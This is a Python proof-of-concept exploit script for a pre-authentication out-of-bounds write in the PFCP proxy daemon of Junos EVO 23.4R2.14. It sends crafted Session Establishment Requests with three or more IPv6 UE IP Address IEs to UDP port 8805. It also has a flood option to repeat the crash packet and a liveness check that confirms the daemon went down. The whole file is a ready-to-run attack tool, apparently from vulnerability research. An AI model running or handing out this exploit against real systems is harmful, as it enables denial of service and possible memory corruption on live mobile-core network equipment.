#!/usr/bin/env python3
"""
PFCP Create Session PoC — Junos EVO 23.4R2.14 bbe-pfcp-proxyd Finding 11
Pre-auth OOB write: 3+ UE IP Address IEs (type 93) carrying IPv6 in a single
Session Establishment Request overwhelms a fixed-size IPv6 address array.

Usage:
    python3 pfcp_evo_poc.py <target-ip> [port]
    python3 pfcp_evo_poc.py 192.168.1.1
    python3 pfcp_evo_poc.py 192.168.1.1 8805 --count 4

Target: bbe-pfcp-proxyd UDP/8805 (standard PFCP port).
No auth required — Session Establishment Request is pre-association.
Binary: PIE, no canary, no RELRO.

3GPP TS 29.244 §7.2.2 defines Session Establishment Request.
"""

import socket, struct, argparse, sys, time

# ---------------------------------------------------------------------------
# PFCP wire format helpers
# ---------------------------------------------------------------------------

def ie(type_: int, value: bytes) -> bytes:
    """Build a PFCP IE: 2-byte type + 2-byte length + value."""
    return struct.pack('>HH', type_, len(value)) + value

def ie_node_id_ipv4(addr: str) -> bytes:
    """Node ID IE (type 60) with IPv4 address. Node ID Type = 0x00 (IPv4)."""
    import ipaddress
    raw = ipaddress.ip_address(addr).packed
    return ie(60, bytes([0x00]) + raw)

def ie_fseid_ipv4(seid: int, addr: str) -> bytes:
    """F-SEID IE (type 57). Flags = 0x02 (IPv4 present)."""
    import ipaddress
    raw = ipaddress.ip_address(addr).packed
    return ie(57, bytes([0x02]) + struct.pack('>Q', seid) + raw)

def ie_pdr_id(pdr_id: int) -> bytes:
    """PDR ID IE (type 56)."""
    return ie(56, struct.pack('>H', pdr_id))

def ie_precedence(value: int) -> bytes:
    """Precedence IE (type 29)."""
    return ie(29, struct.pack('>I', value))

def ie_source_interface(iface: int) -> bytes:
    """Source Interface IE (type 20). 0=Access, 1=Core, 2=SGi-LAN, 3=CP."""
    return ie(20, bytes([iface & 0x0f]))

def ie_ue_ip_address_v6(ipv6: str) -> bytes:
    """
    UE IP Address IE (type 93).
    Flags byte: bit 1 = IPv6 present (0x02), SD=0, CHV4=0, CHV6=0, IPV6D=0.
    Followed by 16 bytes of IPv6 address.
    """
    import ipaddress
    raw = ipaddress.ip_address(ipv6).packed
    return ie(93, bytes([0x02]) + raw)  # flags=0x02: IPv6 present, no IPv4

def ie_pdi(inner_ies: bytes) -> bytes:
    """PDI IE (type 2) — grouped."""
    return ie(2, inner_ies)

def ie_create_pdr(inner_ies: bytes) -> bytes:
    """Create PDR IE (type 1) — grouped."""
    return ie(1, inner_ies)

def ie_far_id(far_id: int) -> bytes:
    """FAR ID IE (type 108)."""
    return ie(108, struct.pack('>I', far_id))

def ie_apply_action(action: int) -> bytes:
    """Apply Action IE (type 44). 0x02 = FORW (forward)."""
    return ie(44, bytes([action & 0xff]))

def ie_create_far(inner_ies: bytes) -> bytes:
    """Create FAR IE (type 3) — grouped."""
    return ie(3, inner_ies)

def pfcp_session_establishment_request(ies: bytes, seq: int = 1) -> bytes:
    """
    PFCP Session Establishment Request (type 50).
    No SEID in request header (S=0).

    Header layout (RFC 29.244 §7.2.2):
      byte 0: version=1 (bits 7-5=001), FO=0, MP=0, S=0  → 0x20
      byte 1: message type = 50 (0x32)
      bytes 2-3: message length (total - 4 header bytes)
      bytes 4-6: sequence number (24-bit big-endian)
      byte 7: spare = 0x00
    """
    msg_type = 50  # Session Establishment Request
    seq_bytes = struct.pack('>I', seq & 0xffffff)[1:]  # 3 bytes
    header = bytes([0x20, msg_type]) + struct.pack('>H', len(ies) + 4) + seq_bytes + bytes([0x00])
    return header + ies

# ---------------------------------------------------------------------------
# PoC payloads
# ---------------------------------------------------------------------------

def build_poc(target_ip: str, ipv6_count: int = 3) -> bytes:
    """
    Build PFCP Session Establishment Request with `ipv6_count` UE IP Address
    IEs each carrying an IPv6 address. Threshold for crash is 3+.
    """
    ipv6_addresses = [
        f"2001:db8::{i+1}" for i in range(ipv6_count)
    ]

    # PDI with multiple UE IP Address IEs
    pdi_ies = (
        ie_source_interface(0) +                    # Access interface
        b''.join(ie_ue_ip_address_v6(a) for a in ipv6_addresses)
    )

    # Create PDR
    create_pdr_ies = (
        ie_pdr_id(1) +
        ie_precedence(100) +
        ie_pdi(pdi_ies) +
        ie_far_id(1)
    )

    # Create FAR
    create_far_ies = (
        ie_far_id(1) +
        ie_apply_action(0x02)
    )

    # Full message IEs
    all_ies = (
        ie_node_id_ipv4(target_ip) +
        ie_fseid_ipv4(0xdeadbeef00000001, target_ip) +
        ie_create_pdr(create_pdr_ies) +
        ie_create_far(create_far_ies)
    )

    return pfcp_session_establishment_request(all_ies, seq=0x424242)

def build_baseline(target_ip: str) -> bytes:
    """
    Baseline: exactly 2 IPv6 Address IEs — within expected bounds.
    Used to confirm normal operation before testing crash threshold.
    """
    return build_poc(target_ip, ipv6_count=2)

# ---------------------------------------------------------------------------
# Probe functions
# ---------------------------------------------------------------------------

PFCP_PORT = 8805

def send_and_receive(target_ip: str, port: int, payload: bytes, timeout: float = 3.0) -> bytes | None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(payload, (target_ip, port))
        data, _ = sock.recvfrom(4096)
        return data
    except socket.timeout:
        return None
    finally:
        sock.close()

def parse_pfcp_response(data: bytes) -> dict:
    if len(data) < 8:
        return {'error': 'too short'}
    flags = data[0]
    msg_type = data[1]
    length = struct.unpack('>H', data[2:4])[0]
    seq = struct.unpack('>I', b'\x00' + data[4:7])[0]
    return {
        'flags': f'{flags:#04x}',
        'msg_type': msg_type,
        'msg_type_name': {
            2: 'Association Setup Response',
            50: 'Session Establishment Request',
            51: 'Session Establishment Response',
            100: 'Node Report Request',
        }.get(msg_type, f'type_{msg_type}'),
        'length': length,
        'seq': seq,
        'raw_hex': data[:16].hex(),
    }

def run_probe(target: str, port: int, ipv6_count: int, label: str):
    payload = build_poc(target, ipv6_count=ipv6_count)
    print(f'\n[{label}]  target={target}:{port}  ipv6_ie_count={ipv6_count}  payload={len(payload)}B')
    print(f'  hex: {payload.hex()[:80]}...')

    resp = send_and_receive(target, port, payload)
    if resp is None:
        print(f'  RESULT: no response (timeout or host unreachable)')
    else:
        parsed = parse_pfcp_response(resp)
        print(f'  RESULT: response received  {parsed}')
    return resp

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description='PFCP bbe-pfcp-proxyd OOB PoC — Junos EVO 23.4R2.14')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('port', nargs='?', type=int, default=PFCP_PORT)
    parser.add_argument('--count', type=int, default=3,
                        help='Number of IPv6 UE IP Address IEs (default 3, crash threshold)')
    parser.add_argument('--baseline-only', action='store_true',
                        help='Send only baseline (2 IEs) to verify connectivity')
    parser.add_argument('--flood', type=int, default=1,
                        help='Send N copies of the crash packet (for crash confirmation)')
    args = parser.parse_args()

    print(f'bbe-pfcp-proxyd OOB PoC — target {args.target}:{args.port}')
    print('Binary: Junos EVO 23.4R2.14 /usr/sbin/bbe-pfcp-proxyd')
    print('Vuln:   UE IP Address IE (type 93) IPv6 count overflow in PDI parser')
    print('Impact: no-canary PIE, no RELRO — OOB write into adjacent struct/stack\n')

    # Connectivity check
    assoc_ie = ie_node_id_ipv4(args.target)
    assoc_req = bytes([0x20, 5]) + struct.pack('>H', len(assoc_ie) + 4) + bytes([0x00, 0x00, 0x01, 0x00]) + assoc_ie
    print('[ASSOC]  sending Association Setup Request (type 5) — connectivity check')
    r = send_and_receive(args.target, args.port, assoc_req)
    if r:
        print(f'  PFCP port open — response {len(r)}B: {r.hex()[:32]}...')
    else:
        print('  no response — host may be unreachable or PFCP not listening')
        print('  continuing with session establishment anyway...')

    if args.baseline_only:
        run_probe(args.target, args.port, 2, 'BASELINE')
        return

    # Baseline: 2 IPv6 IEs (within expected range)
    run_probe(args.target, args.port, 2, 'BASELINE-2-IEs')
    time.sleep(0.5)

    # Crash probe: >= 3 IPv6 IEs
    for i in range(args.flood):
        run_probe(args.target, args.port, args.count, f'POC-{args.count}-IEs-send-{i+1}')
        time.sleep(0.2)

    # Post-crash liveness check
    time.sleep(1.0)
    print(f'\n[LIVENESS-CHECK]  re-sending Association Setup Request...')
    r2 = send_and_receive(args.target, args.port, assoc_req)
    if r2:
        print(f'  daemon still responsive — crash not confirmed or self-restarted')
    else:
        print(f'  NO RESPONSE — daemon may have crashed (confirm via syslog/core dump)')
        print(f'  Finding 11 CONFIRMED: pre-auth crash via UE IP Address IE count overflow')

if __name__ == '__main__':
    main()
